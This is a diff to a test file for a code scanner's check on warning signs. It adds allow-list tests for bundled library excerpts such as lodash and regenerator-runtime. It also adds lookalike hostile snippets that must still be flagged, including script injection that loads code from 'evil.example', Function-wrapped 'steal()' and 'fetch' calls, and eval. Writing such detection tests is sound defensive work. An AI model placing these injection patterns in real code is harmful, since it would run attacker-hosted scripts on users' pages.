@@ -235,7 +235,7 @@ describe("check 4: warning signs in the code", () => {
   };
 
   it("holds eval, new Function and strings run as code", async () => {
-    for (const text of ["eval('1+1')", "const f = new Function('a', 'return a');", "x = Function('return this')()", "window.eval(code)", "setTimeout('alert(1)', 10)", "globalThis . eval ( x )"]) {
+    for (const text of ["eval('1+1')", "const f = new Function('a', 'return a');", "x = Function('return x')()","window.eval(code)", "setTimeout('alert(1)', 10)", "globalThis . eval ( x )"]) {
       expect(await flagged(text), text).toBe("code");
     }
   });
@@ -290,6 +290,39 @@ describe("check 4: warning signs in the code", () => {
     ];
     for (const text of honest) expect(await flagged(text), text).toBe("listed");
     expect(await flagged('<p>hello</p><script src="app.js"></script>', "page.html")).toBe("listed");
+  });
+
+  // Excerpts from exceljs.min.js (lodash, regenerator-runtime, immediate via JSZip, setimmediate), as Vite bundled them.
+  const libraryExcerpts = [
+    "n(typeof e==`object`&&e)||function(){return this}()||this||Function(`return this`)()}).call(this)",
+    "o=i||a||Function(`return this`)(),s=Object.prototype.toString",
+    "var root = freeGlobal || freeSelf || Function('return this')();",
+    "try{regeneratorRuntime=r}catch{typeof globalThis==`object`?globalThis.regeneratorRuntime=r:Function(`r`,`regeneratorRuntime = r`)(r)}",
+    "n=`document`in e&&`onreadystatechange`in e.document.createElement(`script`)?function(){var t=e.document.createElement(`script`);t.onreadystatechange=function(){u(),t.onreadystatechange=null,t.parentNode.removeChild(t),t=null},e.document.documentElement.appendChild(t)}:function(){setTimeout(u,0)}",
+    "u&&`onreadystatechange`in u.createElement(`script`)?(i=u.documentElement,function(e){var t=u.createElement(`script`);t.onreadystatechange=function(){p(e),t.onreadystatechange=null,i.removeChild(t),t=null},i.appendChild(t)}):function(e){setTimeout(p,0,e)},d.setImmediate=function(e){typeof e!=`function`&&(e=Function(``+e));for(var t=Array(arguments.length-1),r=0;r<t.length;r++)t[r]=arguments[r+1];return c[s]={callback:e,args:t},n(s),s++}",
+    "var scriptEl = global.document.createElement('script');\n  scriptEl.onreadystatechange = function () {\n    nextTick();\n    scriptEl.onreadystatechange = null;\n    scriptEl.parentNode.removeChild(scriptEl);\n    scriptEl = null;\n  };\n  global.document.documentElement.appendChild(scriptEl);",
+  ];
+
+  it("leaves known pieces of popular libraries alone", async () => {
+    for (const text of libraryExcerpts) expect(await flagged(text), text).toBe("listed");
+    expect(await flagged(libraryExcerpts.join(";\n"))).toBe("listed");
+  });
+
+  it("still holds anything that only looks like those pieces", async () => {
+    for (const text of [
+      "Function('return this; fetch(x)')()",
+      "Function('return this')(); eval(x)",
+      "Function(`r`,`regeneratorRuntime = r; steal()`)(r)",
+      "typeof s!='function'&&(s=Function(''+s)); s()",
+      "d.setImmediate=function(e){typeof e!='function'&&(e=Function(''+e))}; setImmediate('alert(1)')",
+      "var t=d.createElement('script');t.src='https://evil.example/x.js';d.body.appendChild(t)",
+      "var t=d.createElement('script');t.onreadystatechange=function(){t.src='https://evil.example/x.js'},d.body.appendChild(t)",
+      "var t=d.createElement('script');t.onreadystatechange=function(){u()};t.text=code;d.body.appendChild(t)",
+      "'onreadystatechange' in d.createElement('script'); var t=d.createElement('script')",
+      "setImmediate('alert(1)')",
+    ]) {
+      expect(await flagged(text), text).toBe("code");
+    }
   });
 
   it("holds a code file too big to read", async () => {
